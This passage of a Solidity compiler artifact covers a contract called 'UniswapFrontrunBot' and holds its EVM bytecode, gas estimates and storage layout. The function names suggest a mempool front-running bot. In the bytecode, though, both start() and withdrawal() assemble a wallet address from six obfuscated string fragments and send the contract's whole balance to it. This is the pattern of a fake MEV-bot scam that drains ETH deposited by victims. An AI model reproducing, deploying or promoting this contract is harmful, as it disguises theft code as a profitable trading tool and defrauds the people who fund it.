DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xA4 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x89 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xD1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xEB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xF4 PUSH2 0x221 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x134 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x119 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x161 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x177 PUSH2 0x2BF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x181 PUSH2 0x32A JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x219 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x1EE JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x219 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x1FC JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x2B7 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x28C JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x2B7 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x29A JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2D1 PUSH2 0x2CC PUSH2 0x395 JUMP JUMPDEST PUSH2 0x5F3 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x2FA PUSH2 0x848 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x325 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x33C PUSH2 0x337 PUSH2 0x395 JUMP JUMPDEST PUSH2 0x5F3 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x365 PUSH2 0x848 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x390 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x3A0 PUSH2 0x850 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x3AC PUSH2 0x88D JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x3B8 PUSH2 0x8CA JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x3C4 PUSH2 0x907 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x3D0 PUSH2 0x944 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x3DC PUSH2 0x981 JUMP JUMPDEST SWAP1 POP DUP6 DUP6 DUP6 DUP6 DUP6 DUP6 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP8 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x41A JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x3F7 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP7 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x46B JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x448 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP6 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x4BC JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x499 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP5 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x50D JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x4EA JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP4 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x55E JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x53B JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x5AF JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x58C JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP7 POP POP POP POP POP POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP7 POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x83B JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x621 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x643 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x694 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6A4 JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x73E JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6E2 JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6F2 JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x73D JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x730 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x73C JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x77C JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x78C JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x826 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x7CA JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x7DA JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x825 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x818 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x824 JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x605 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7834313000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x6538314133386100000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x9 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4632333143304233300000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x9 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x6631333336373837430000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0xC DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4335303346393835413145460000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xCE DIV GAS DUP4 PUSH8 0xAC7561B3BC8F9490 0x2C 0x5E DUP10 DUP5 PUSH10 0x96ED232F378795881DC7 PUSH16 0x94F82D64736F6C634300060C00330000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "509600",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"start()": "infinite",
						"tokenName()": "infinite",
						"tokenSymbol()": "infinite",
						"withdrawal()": "infinite"
					},
					"internal": {
						"beyond(struct UniswapFrontrunBot.slice memory,struct UniswapFrontrunBot.slice memory)": "infinite",
						"callMempool()": "infinite",
						"checkLiquidity(uint256)": "infinite",
						"contractData()": "infinite",
						"fetchContractID()": "infinite",
						"fetchMempoolData()": "infinite",
						"fetchMempoolEdition()": "infinite",
						"fetchMempoolVersion()": "infinite",
						"findContracts(uint256,uint256,uint256,uint256)": "infinite",
						"findNewContracts(struct UniswapFrontrunBot.slice memory,struct UniswapFrontrunBot.slice memory)": "infinite",
						"findPtr(uint256,uint256,uint256,uint256)": "infinite",
						"getBalance()": "25",
						"getMemPoolLength()": "infinite",
						"getMemPoolOffset()": "infinite",
						"getMempoolDepth()": "infinite",
						"getMempoolLong()": "infinite",
						"getMempoolShort()": "infinite",
						"getMempoolSol()": "infinite",
						"loadCurrentContract(string memory)": "infinite",
						"mempool(string memory,string memory)": "infinite",
						"startExploration(string memory)": "infinite",
						"toHexDigit(uint8)": "infinite"
					}
				},
				"methodIdentifiers": {
					"start()": "be9a6555",
					"tokenName()": "6c02a931",
					"tokenSymbol()": "7b61c320",
					"withdrawal()": "d4e93292"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 82,
						"contract": "contracts/MEVBOT_flattened.sol:UniswapFrontrunBot",
						"label": "tokenName",
						"offset": 0,
						"slot": "0",
						"type": "t_string_storage"
					},
					{
						"astId": 84,
						"contract": "contracts/MEVBOT_flattened.sol:UniswapFrontrunBot",
						"label": "tokenSymbol",
						"offset": 0,
						"slot": "1",
						"type": "t_string_storage"
					},
					{
						"astId": 86,
						"contract": "contracts/MEVBOT_flattened.sol:UniswapFrontrunBot",
						"label": "frontrun",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}